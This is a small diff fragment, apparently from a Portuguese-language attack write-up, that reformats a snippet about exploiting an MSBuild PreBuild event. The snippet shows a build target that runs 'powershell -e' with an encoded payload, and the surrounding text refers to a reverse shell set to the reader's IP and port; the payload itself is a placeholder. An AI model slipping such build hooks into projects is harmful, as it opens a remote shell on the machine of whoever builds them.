@@ -27,7 +27,7 @@ Após que ajustar a Revershell conforme Seu IP e PORTA, será necessário encoda
 
 Evento que iremos explorar:
 
-`   <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
+`<Target Name="PreBuild" BeforeTargets="PreBuildEvent">
         <Exec Command="powershell -e **encode aqui**"/>
     </Target>`
 
